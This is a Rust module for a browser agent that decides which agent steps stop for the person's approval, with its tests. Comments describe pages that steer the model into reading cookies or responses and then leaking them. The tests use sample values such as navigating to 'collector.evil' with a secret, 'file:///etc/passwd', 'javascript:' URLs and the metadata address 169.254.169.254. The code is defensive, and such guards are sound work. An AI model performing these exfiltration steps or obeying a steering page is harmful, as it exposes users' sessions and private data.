//! Whether a step is worth stopping the agent for.
//!
//! Asking about every action trains people to stop reading. The dialog that
//! appears before a scroll is the same dialog that appears before a transfer,
//! so the answer becomes "allow" long before the transfer arrives -- and the
//! way out people actually take is to turn approvals off entirely, which
//! removes the check altogether. That is the failure this module exists to
//! avoid: the useful question is not "does this change the page" but "what
//! does this cost if it was the wrong step".
//!
//! So a step is judged on three things: what the tool does, where the page
//! is, and what the target is called. Ordinary work -- clicking a link,
//! filling a search box, scrolling -- runs. Anything that spends money,
//! destroys something, hands over a secret, or happens on a page where
//! mistakes are expensive stops and asks.
//!
//! This is a floor, not a guarantee. A page can call its Delete button
//! "Continue", and no keyword list will catch that. It is here so that the
//! approvals people do see are worth reading, and it is deliberately easy to
//! go back to asking about everything.
//!
//! A few questions are asked whatever the setting says, "allow all" included
//! (see [`Caution::always`]): the steps that hand something over rather
//! than change a page. Reading a site's cookies or a server's response is
//! one of them, because what was read can leave with the next step -- and so
//! once a run has read something private, taking it anywhere else is another.
//!
//! That mark comes in two strengths. A firm one, left by cookies, response
//! bodies and the console, asks in every mode. A soft one, left by reading
//! the pages of the person's own tabs, asks only in the default mode: those
//! reads happen in nearly every run, and asking about them in every mode
//! would turn "allow all" off in practice. Leaving the public web for the
//! local network asks in the default mode as well.

use serde_json::Value;

/// Tools whose outcome is never worth waving through, whatever the page says.
///
/// These either leave data behind, take data in, or reconfigure the browser
/// rather than the page, and none of them is something an agent needs to do
/// dozens of times in a run.
const ALWAYS_ASK: &[(&str, &str)] = &[
    (
        "page_upload",
        "this sends a file from your computer to the page",
    ),
    ("page_storage_set", "this writes to the site's stored data"),
    (
        "page_storage_clear",
        "this erases the site's stored data, including what keeps you signed in",
    ),
    (
        "context_close",
        "this throws away a browsing context and its session",
    ),
    ("tab_close", "this closes a tab"),
    (
        "rules_set",
        "this changes how the browser answers network requests",
    ),
    (
        "page_dialog",
        "this answers a dialog the page is waiting on",
    ),
];

/// Reads that hand the model what keeps the person signed in, or what a
/// server sent only to them.
///
/// These are not actions -- nothing on the page changes -- but they are the
/// first half of every exfiltration: a page that steers the model has to get
/// it to read the secret before it can get it to send it anywhere.
const SENSITIVE_READS: &[(&str, &str)] = &[
    (
        "page_storage",
        "this reads the site's cookies and stored data, including what keeps you signed in",
    ),
    (
        "network_body",
        "this reads what the server sent back, which can hold your private data",
    ),
];

/// Reads after which the run is holding something of a site's that should
/// not follow it elsewhere. The two above, and the console, where pages log
/// tokens and responses more often than they should.
const TAINTING: &[&str] = &["page_storage", "network_body", "console_tail"];

/// Reads of a page's content. A run that has read the person's own tabs with
/// one of these is holding something that may be private, but far less often
/// than after a [`TAINTING`] read, so carrying text to another site afterwards
/// is asked about in the default mode only (the soft mark, [`Step::seen`]),
/// not in every mode (the firm mark, [`Step::tainted`]).
const READS_PAGE: &[&str] = &[
    "page_inspect",
    "page_text",
    "page_markdown",
    "page_snapshot",
    "page_diff",
    "page_screenshot",
    "page_state",
    "page_locate",
    "page_component",
    "page_report",
    "network_list",
];

/// Steps that carry text somewhere: the address of a page, or what is typed
/// into one. After a tainting read, these are the ways out.
const CARRIES_TEXT: &[&str] = &[
    "tab_navigate",
    "tab_open",
    "page_type",
    "page_fill_form",
    "page_keys",
];

/// Actions that are ordinary in themselves but leave something behind on
/// the person's computer, and are worth a look in the default mode.
const LEAVES_A_FILE: &[(&str, &str)] = &[("page_pdf", "this saves a file to your download folder")];

/// Words that name something a person cannot get back by pressing Back.
///
/// Whole words only, and deliberately not `submit`, `confirm`, `continue`,
/// `save` or `cancel`: those appear on nearly every form, so including them
/// would put us back where we started.
const IRREVERSIBLE: &[&str] = &[
    "buy",
    "purchase",
    "order",
    "checkout",
    "pay",
    "payment",
    "subscribe",
    "donate",
    "transfer",
    "withdraw",
    "deposit",
    "send",
    "post",
    "publish",
    "tweet",
    "delete",
    "destroy",
    "remove",
    "deactivate",
    "terminate",
    "revoke",
    "uninstall",
    "unsubscribe",
    "unfriend",
    "block",
    "archive",
    "merge",
    "deploy",
    "release",
];

/// Words that name a secret being handed over.
const SECRETS: &[&str] = &[
    "password",
    "passcode",
    "passphrase",
    "otp",
    "cvv",
    "cvc",
    "pin",
    "ssn",
    "seed",
    "mnemonic",
    "secret",
    "token",
    "2fa",
];

/// Words in a host or path that mean money or an account is at stake.
const SENSITIVE: &[&str] = &[
    "bank",
    "banking",
    "checkout",
    "billing",
    "invoice",
    "payment",
    "payments",
    "pay",
    "wallet",
    "transfer",
    "wire",
    "withdraw",
    "account",
    "accounts",
    "tax",
    "payroll",
    "insurance",
    "brokerage",
    "trading",
    "crypto",
    "exchange",
];

/// Why a step is put to the person before it runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Caution {
    /// The reason, as a clause the chrome can put before "Allow it?".
    pub why: String,
    /// Asked in every mode, "Never" and "allow all this session" included.
    ///
    /// Answering ahead of time is a decision about clicking and typing; it
    /// was never meant as a decision to hand over a file, a session or what
    /// a server sent, and a page that steers the model is counting on the
    /// person having said yes to everything once.
    pub always: bool,
}

impl Caution {
    fn always(why: impl Into<String>) -> Self {
        Self {
            why: why.into(),
            always: true,
        }
    }

    fn costly(why: impl Into<String>) -> Self {
        Self {
            why: why.into(),
            always: false,
        }
    }
}

/// What a step is judged on.
#[derive(Debug, Clone, Copy)]
pub struct Step<'a> {
    /// The tool.
    pub tool: &'a str,
    /// Its arguments.
    pub input: &'a Value,
    /// What the host found the step is aimed at, when the arguments do not
    /// say by name: the locator a ref resolved to, the element under a
    /// coordinate, or the element that has focus.
    pub target: Option<&'a str>,
    /// The address of the tab the step acts on -- the one it names, not the
    /// one the run started in.
    pub url: &'a str,
    /// Sites this run has read private data from (see [`taints`]).
    pub tainted: &'a [String],
    /// Sites whose pages this run has read in the person's own tabs.
    pub seen: &'a [String],
}

/// Why the user is being asked, or `None` when the step may just run.
///
/// `locator` is the resolved Playwright locator when the call used a ref, so
/// the element's accessible name is judged even when the model addressed it
/// by node id.
#[cfg(test)]
pub fn caution(tool: &str, input: &Value, locator: Option<&str>, url: &str) -> Option<String> {
    judge(&Step {
        tool,
        input,
        target: locator,
        url,
        tainted: &[],
        seen: &[],
    })
    .map(|c| c.why)
}

/// Whether to stop before `step`, and how firmly.
pub fn judge(step: &Step<'_>) -> Option<Caution> {
    let Step {
        tool, input, url, ..
    } = *step;
    if let Some((_, why)) = ALWAYS_ASK.iter().find(|(name, _)| *name == tool) {
        return Some(Caution::always(*why));
    }
    if let Some((_, why)) = SENSITIVE_READS.iter().find(|(name, _)| *name == tool) {
        return Some(Caution::always(*why));
    }
    if let Some(why) = carries_taint(step, step.tainted, true) {
        return Some(Caution::always(why));
    }
    if let Some(why) = carries_taint(step, step.seen, false) {
        return Some(Caution::costly(why));
    }
    if !crate::agent_tools::is_action(tool) {
        return None;
    }
    if let Some(why) = navigation_caution(step) {
        return Some(Caution::costly(why));
    }
    if let Some((_, why)) = LEAVES_A_FILE.iter().find(|(name, _)| *name == tool) {
        return Some(Caution::costly(*why));
    }
    let target = target_text(input, step.target);
    if tool_types(tool) && has_word(&target, SECRETS) {
        return Some(Caution::costly("this field looks like it holds a secret"));
    }
    if let Some(word) = word_in(&target, IRREVERSIBLE) {
        return Some(Caution::costly(format!(
            "“{word}” reads as something that cannot be undone"
        )));
    }
    if let Some(word) = sensitive_place(url) {
        return Some(Caution::costly(format!(
            "this page is about {word}, where a wrong step is expensive"
        )));
    }
    None
}

/// Whether a run that has run `tool` is now holding a site's private data.
pub fn taints(tool: &str) -> bool {
    TAINTING.contains(&tool)
}

/// Whether `tool` reads the page's content, which leaves a soft mark on a
/// run working in the person's own tabs (see [`Step::seen`]).
pub fn reads_page(tool: &str) -> bool {
    READS_PAGE.contains(&tool)
}

/// Where a step would carry text, as a site: the page an address leads to,
/// or the page being typed into. `None` when that cannot be told -- a search
/// term, an address that does not parse -- which counts as somewhere else.
fn destination(step: &Step<'_>) -> Option<String> {
    match step.tool {
        "tab_navigate" | "tab_open" => {
            let given = step.input["url"].as_str()?.trim();
            crate::site::of(given).or_else(|| {
                // A bare host is opened over https by the browser; a phrase
                // with a space is a search, which is another site entirely.
                (!given.contains(char::is_whitespace) && given.contains('.'))
                    .then(|| crate::site::of(&format!("https://{given}")))
                    .flatten()
            })
        }
        _ => crate::site::of(step.url),
    }
}

/// The question to ask when a run that read `sites` is about to carry text to
/// another. `strong` marks private data (cookies, responses, the console);
/// otherwise the run has only read the person's pages.
fn carries_taint(step: &Step<'_>, sites: &[String], strong: bool) -> Option<String> {
    if sites.is_empty() || !CARRIES_TEXT.contains(&step.tool) {
        return None;
    }
    let to = destination(step);
    if to.as_ref().is_some_and(|to| sites.contains(to)) {
        return None;
    }
    let from = sites.join(", ");
    let read = if strong {
        format!("private data from {from}")
    } else {
        from
    };
    Some(match to {
        Some(to) => format!("this run has read {read}, and this step would carry text to {to}"),
        None => format!("this run has read {read}, and this step would carry text somewhere else"),
    })
}

/// Navigating is ordinary; navigating out of the web is not. `javascript:`
/// runs code in the page and `file:` reaches the disk, neither of which the
/// typed tools would otherwise let the model do. Nor is going from a public
/// page to the local network: that is how a page reaches a router, a
/// metadata service or a dev server it has no business with.
fn navigation_caution(step: &Step<'_>) -> Option<String> {
    if !matches!(step.tool, "tab_navigate" | "tab_open") {
        return None;
    }
    let given = step.input["url"].as_str()?.trim();
    if step.tool == "tab_navigate" {
        let lower = given.to_ascii_lowercase();
        let scheme = lower.split(':').next().unwrap_or_default();
        match scheme {
            "http" | "https" | "about" | "" => {}
            "javascript" => {
                return Some(
                    "this runs code in the page rather than opening an address".to_owned(),
                );
            }
            other => return Some(format!("this leaves the web for a {other}: address")),
        }
    }
    let to = parse_destination(given)?;
    if !crate::netfetch::names_local_host(&to) {
        return None;
    }
    let from = url::Url::parse(step.url).ok()?;
    if !matches!(from.scheme(), "http" | "https") || crate::netfetch::names_local_host(&from) {
        return None;
    }
    let site = crate::site::of(step.url).unwrap_or_else(|| "the web".to_owned());
    Some(format!(
        "this leaves {site} for an address on your computer or local network"
    ))
}

/// The address a navigation input leads to; a bare host is opened over https.
fn parse_destination(given: &str) -> Option<url::Url> {
    url::Url::parse(given)
        .ok()
        .filter(|u| u.host().is_some())
        .or_else(|| {
            (!given.contains(char::is_whitespace))
                .then(|| url::Url::parse(&format!("https://{given}")).ok())
                .flatten()
        })
}

/// Tools that put a value into a field.
fn tool_types(tool: &str) -> bool {
    matches!(tool, "page_type" | "page_fill_form" | "page_keys")
}

/// What the call says about the element it is aiming at: the locator the
/// model wrote, the one the host resolved, and the field names in a form
/// fill.
///
/// Deliberately not the value being typed. Searching a page for "delete my
/// account" is not the same as pressing Delete, and judging a step by the
/// text it carries would stop the first as often as the second.
fn target_text(input: &Value, locator: Option<&str>) -> String {
    let mut out = String::new();
    for key in ["locator", "label", "name", "from", "to"] {
        if let Some(s) = input[key].as_str() {
            out.push_str(s);
            out.push(' ');
        }
    }
    if let Some(fields) = input["fields"].as_array() {
        for field in fields {
            for key in ["locator", "label", "name"] {
                if let Some(s) = field[key].as_str() {
                    out.push_str(s);
                    out.push(' ');
                }
            }
        }
    }
    if let Some(locator) = locator {
        out.push_str(locator);
    }
    out.to_lowercase()
}

/// The word that made a place sensitive, if any: a host label or a path
/// segment, never a substring -- `paypal.com` counts, `company.com` does not.
fn sensitive_place(url: &str) -> Option<&'static str> {
    let rest = url.split_once("://").map_or(url, |(_, rest)| rest);
    let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
    let host = authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host)
        .to_lowercase();
    // A whole label, not a file extension: `first.bank` counts, `mybank` does not.
    if host.rsplit('.').next() == Some("bank") {
        return Some("banking");
    }
    let words = host
        .split(['.', '-'])
        .chain(path.split(['/', '-', '_', '?', '&', '=']))
        .map(str::to_lowercase);
    for word in words {
        if let Some(found) = SENSITIVE.iter().find(|s| **s == word) {
            return Some(found);
        }
    }
    None
}

/// Whether any of `words` appears in `text` as a whole word.
fn has_word(text: &str, words: &[&str]) -> bool {
    word_in(text, words).is_some()
}

/// The first of `words` that appears in `text` as a whole word.
fn word_in<'a>(text: &str, words: &[&'a str]) -> Option<&'a str> {
    let found: Vec<&str> = text
        .split(|c: char| !c.is_alphanumeric())
        .filter(|w| !w.is_empty())
        .collect();
    words.iter().copied().find(|w| found.contains(w))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const ORDINARY: &str = "https://example.com/docs/guide";

    fn ask(tool: &str, input: &Value, url: &str) -> Option<String> {
        caution(tool, input, None, url)
    }

    #[test]
    fn ordinary_work_on_an_ordinary_page_just_runs() {
        assert_eq!(
            ask(
                "page_click",
                &json!({"locator": "role=link[name=\"Docs\"]"}),
                ORDINARY
            ),
            None
        );
        assert_eq!(ask("page_scroll", &json!({"delta_y": 400}), ORDINARY), None);
        assert_eq!(
            ask(
                "page_type",
                &json!({"locator": "role=searchbox", "text": "tauri"}),
                ORDINARY
            ),
            None
        );
        assert_eq!(
            ask(
                "tab_navigate",
                &json!({"url": "https://example.com/next"}),
                ORDINARY
            ),
            None
        );
        // Reading is never an action, wherever it happens.
        assert_eq!(
            ask("page_text", &json!({}), "https://bank.example.com/transfer"),
            None
        );
    }

    #[test]
    fn spending_and_destroying_stop_however_they_are_addressed() {
        assert!(
            ask(
                "page_click",
                &json!({"locator": "role=button[name=\"Buy now\"]"}),
                ORDINARY
            )
            .is_some()
        );
        assert!(
            ask(
                "page_click",
                &json!({"locator": "role=button[name=\"Delete account\"]"}),
                ORDINARY
            )
            .is_some()
        );
        // Addressed by ref, the resolved locator is what carries the name.
        assert!(
            caution(
                "page_click",
                &json!({"ref": "e7"}),
                Some("getByRole('button', { name: 'Send payment' })"),
                ORDINARY,
            )
            .is_some()
        );
        // The words a form puts on every page are not enough on their own.
        assert_eq!(
            ask(
                "page_click",
                &json!({"locator": "role=button[name=\"Submit\"]"}),
                ORDINARY
            ),
            None
        );
        assert_eq!(
            ask(
                "page_click",
                &json!({"locator": "role=button[name=\"Save changes\"]"}),
                ORDINARY
            ),
            None
        );
    }

    #[test]
    fn a_page_about_money_makes_every_action_worth_seeing() {
        let why = ask(
            "page_click",
            &json!({"locator": "role=button[name=\"Next\"]"}),
            "https://example.com/checkout/step2",
        )
        .unwrap();
        assert!(why.contains("checkout"), "{why}");
        assert!(ask("page_click", &json!({}), "https://my.bank/dashboard").is_some());
        // A substring is not a word: this is an ordinary company page.
        assert_eq!(
            ask(
                "page_click",
                &json!({}),
                "https://accountancy-weekly.example/news"
            ),
            None
        );
    }

    #[test]
    fn secrets_and_non_web_addresses_are_never_waved_through() {
        assert!(
            ask(
                "page_type",
                &json!({"locator": "role=textbox[name=\"Password\"]", "text": "x"}),
                ORDINARY
            )
            .is_some()
        );
        assert!(
            ask(
                "page_type",
                &json!({"locator": "css=#otp", "text": "123456"}),
                ORDINARY
            )
            .is_some()
        );
        assert!(
            ask(
                "tab_navigate",
                &json!({"url": "javascript:alert(1)"}),
                ORDINARY
            )
            .is_some()
        );
        assert!(
            ask(
                "tab_navigate",
                &json!({"url": "file:///etc/passwd"}),
                ORDINARY
            )
            .is_some()
        );
    }

    #[test]
    fn the_always_ask_tools_ask_wherever_they_are_called() {
        for (tool, _) in ALWAYS_ASK {
            assert!(
                ask(tool, &json!({}), ORDINARY).is_some(),
                "{tool} ran unasked"
            );
        }
    }

    fn judged(tool: &str, input: &Value, url: &str, tainted: &[&str]) -> Option<Caution> {
        let tainted: Vec<String> = tainted.iter().map(|s| (*s).to_owned()).collect();
        judge(&Step {
            tool,
            input,
            target: None,
            url,
            tainted: &tainted,
            seen: &[],
        })
    }

    fn judged_seen(tool: &str, input: &Value, url: &str, seen: &[&str]) -> Option<Caution> {
        let seen: Vec<String> = seen.iter().map(|s| (*s).to_owned()).collect();
        judge(&Step {
            tool,
            input,
            target: None,
            url,
            tainted: &[],
            seen: &seen,
        })
    }

    #[test]
    fn reading_what_keeps_a_person_signed_in_always_asks() {
        for tool in ["page_storage", "network_body"] {
            let caution = judged(tool, &json!({}), ORDINARY, &[]).expect(tool);
            assert!(caution.always, "{tool} must ask in every mode");
        }
        // Reading the page itself is what the agent is for.
        assert_eq!(judged("page_text", &json!({}), ORDINARY, &[]), None);
        assert_eq!(judged("console_tail", &json!({}), ORDINARY, &[]), None);
        assert!(taints("console_tail") && taints("page_storage") && taints("network_body"));
        assert!(!taints("page_text"));
    }

    #[test]
    fn the_always_ask_tools_ask_in_every_mode() {
        for (tool, _) in ALWAYS_ASK {
            assert!(
                judged(tool, &json!({}), ORDINARY, &[]).unwrap().always,
                "{tool}"
            );
        }
        // A costly click is costly, not a matter for every mode.
        let buy = judged(
            "page_click",
            &json!({"locator": "role=button[name=\"Buy now\"]"}),
            ORDINARY,
            &[],
        )
        .unwrap();
        assert!(!buy.always);
    }

    #[test]
    fn after_a_private_read_carrying_text_to_another_site_asks() {
        let tainted = ["mail.example"];
        let to_elsewhere = judged(
            "tab_navigate",
            &json!({"url": "https://collector.evil/?q=secret"}),
            "https://mail.example/inbox",
            &tainted,
        )
        .expect("leaving with the data must ask");
        assert!(to_elsewhere.always);
        assert!(
            to_elsewhere.why.contains("mail.example"),
            "{}",
            to_elsewhere.why
        );
        assert!(
            to_elsewhere.why.contains("collector.evil"),
            "{}",
            to_elsewhere.why
        );
        // A bare host and a search term are somewhere else too.
        assert!(
            judged(
                "tab_open",
                &json!({"url": "collector.evil/x"}),
                ORDINARY,
                &tainted
            )
            .is_some()
        );
        assert!(
            judged(
                "tab_open",
                &json!({"url": "what is my token"}),
                ORDINARY,
                &tainted
            )
            .is_some()
        );
        // Typing into a page of another site is a way out as well.
        assert!(
            judged(
                "page_type",
                &json!({"locator": "role=searchbox", "text": "x"}),
                "https://forum.example.org/new",
                &tainted
            )
            .is_some()
        );
        assert!(
            judged(
                "page_fill_form",
                &json!({"fields": [{"locator": "css=#q", "value": "x"}]}),
                "https://forum.example.org/new",
                &tainted
            )
            .is_some()
        );
        // Staying on the site that was read is the work itself.
        assert_eq!(
            judged(
                "tab_navigate",
                &json!({"url": "https://app.mail.example/settings"}),
                "https://mail.example/inbox",
                &tainted
            ),
            None
        );
        assert_eq!(
            judged(
                "page_type",
                &json!({"locator": "role=searchbox", "text": "x"}),
                "https://mail.example/inbox",
                &tainted
            ),
            None
        );
        // Before anything private was read, leaving is ordinary.
        assert_eq!(
            judged(
                "tab_navigate",
                &json!({"url": "https://collector.evil/"}),
                ORDINARY,
                &[]
            ),
            None
        );
    }

    #[test]
    fn a_pdf_is_worth_a_look_but_not_in_every_mode() {
        let pdf = judged("page_pdf", &json!({}), ORDINARY, &[]).unwrap();
        assert!(!pdf.always);
        assert!(pdf.why.contains("file"), "{}", pdf.why);
    }

    #[test]
    fn a_target_the_host_resolved_is_judged_like_a_named_one() {
        // A click at a coordinate names nothing; the element found there does.
        let clicked = judge(&Step {
            tool: "page_mouse",
            input: &json!({"steps": [{"action": "click", "x": 10, "y": 10}]}),
            target: Some("button \"Delete account\""),
            url: ORDINARY,
            tainted: &[],
            seen: &[],
        });
        assert!(clicked.is_some());
        let pressed = judge(&Step {
            tool: "page_keys",
            input: &json!({"steps": [{"key": "Enter"}]}),
            target: Some("button \"Send payment\""),
            url: ORDINARY,
            tainted: &[],
            seen: &[],
        });
        assert!(pressed.is_some());
        let typed = judge(&Step {
            tool: "page_keys",
            input: &json!({"steps": [{"text": "hunter2"}]}),
            target: Some("textbox \"Password\""),
            url: ORDINARY,
            tainted: &[],
            seen: &[],
        });
        assert!(typed.is_some());
    }

    #[test]
    fn a_form_fill_is_judged_on_the_fields_it_names() {
        let input = json!({"fields": [{"locator": "css=#email", "value": "a@b.c"}, {"locator": "role=textbox[name=\"Password\"]", "value": "x"}]});
        assert!(caution("page_fill_form", &input, None, ORDINARY).is_some());
        let plain = json!({"fields": [{"locator": "css=#email", "value": "a@b.c"}]});
        assert_eq!(caution("page_fill_form", &plain, None, ORDINARY), None);
    }

    #[test]
    fn every_page_read_named_here_is_a_real_tool() {
        let specs = crate::agent_tools::specs();
        for name in READS_PAGE {
            assert!(
                specs.iter().any(|s| s.name == *name),
                "{name} is not a tool"
            );
            assert!(!TAINTING.contains(name), "{name} is already firm");
            assert!(!crate::agent_tools::is_action(name), "{name} is an action");
            assert!(reads_page(name));
        }
    }

    #[test]
    fn after_reading_the_persons_page_carrying_text_elsewhere_asks_in_the_default_mode() {
        let seen = ["mail.example"];
        let away = judged_seen(
            "tab_navigate",
            &json!({"url": "https://docs.example.org/"}),
            "https://mail.example/inbox",
            &seen,
        )
        .expect("carrying text away must ask");
        assert!(!away.always);
        assert!(away.why.contains("mail.example"), "{}", away.why);
        assert!(away.why.contains("example.org"), "{}", away.why);
        assert!(!away.why.contains("private data"), "{}", away.why);
        let typed = judged_seen(
            "page_type",
            &json!({"locator": "role=searchbox", "text": "x"}),
            "https://forum.example.org/new",
            &seen,
        )
        .expect("typing elsewhere must ask");
        assert!(!typed.always);
    }

    #[test]
    fn staying_on_a_read_site_is_the_work_itself() {
        assert_eq!(
            judged_seen(
                "tab_navigate",
                &json!({"url": "https://app.mail.example/settings"}),
                "https://mail.example/inbox",
                &["mail.example"],
            ),
            None
        );
    }

    #[test]
    fn a_firm_taint_still_asks_in_every_mode_when_both_are_present() {
        let tainted = vec!["bank.example".to_owned()];
        let seen = vec!["mail.example".to_owned()];
        let caution = judge(&Step {
            tool: "tab_navigate",
            input: &json!({"url": "https://docs.example.org/"}),
            target: None,
            url: "https://mail.example/inbox",
            tainted: &tainted,
            seen: &seen,
        })
        .unwrap();
        assert!(caution.always);
        assert!(caution.why.contains("private data"), "{}", caution.why);
    }

    #[test]
    fn leaving_the_web_for_the_local_network_asks() {
        let page = "https://docs.example.org/";
        for tool in ["tab_navigate", "tab_open"] {
            for url in [
                "http://localhost:3000/",
                "http://127.0.0.1/",
                "http://10.0.0.5/",
                "http://169.254.169.254/",
                "http://[::1]/",
                "localhost:8080",
            ] {
                let caution = judged(tool, &json!({"url": url}), page, &[])
                    .unwrap_or_else(|| panic!("{tool} {url} ran unasked"));
                assert!(!caution.always, "{tool} {url}");
                // `tab_navigate` already treats a bare `host:port` as a
                // scheme of its own and asks for that reason.
                if !(tool == "tab_navigate" && url == "localhost:8080") {
                    assert!(caution.why.contains("example.org"), "{}", caution.why);
                }
            }
        }
    }

    #[test]
    fn local_work_stays_quiet() {
        let local = json!({"url": "http://127.0.0.1:5173/other"});
        assert_eq!(
            judged("tab_navigate", &local, "http://localhost:5173/", &[]),
            None
        );
        for blank in ["about:blank", ""] {
            assert_eq!(
                judged(
                    "tab_open",
                    &json!({"url": "http://localhost:3000"}),
                    blank,
                    &[]
                ),
                None
            );
        }
        assert_eq!(
            judged(
                "tab_navigate",
                &json!({"url": "https://forum.example.org/"}),
                "https://docs.example.org/",
                &[]
            ),
            None
        );
    }

    #[test]
    fn ordinary_research_stays_quiet_without_a_read() {
        let page = "https://docs.example.org/";
        let scenarios = [
            (
                "tab_open",
                json!({"url": "https://search.example/?q=tauri"}),
            ),
            (
                "tab_navigate",
                json!({"url": "https://forum.example.org/t/1"}),
            ),
            (
                "page_type",
                json!({"locator": "role=searchbox", "text": "tauri"}),
            ),
            ("page_text", json!({})),
            ("page_snapshot", json!({})),
        ];
        for (tool, input) in &scenarios {
            assert_eq!(judged(tool, input, page, &[]), None, "{tool} {input}");
        }
    }
}
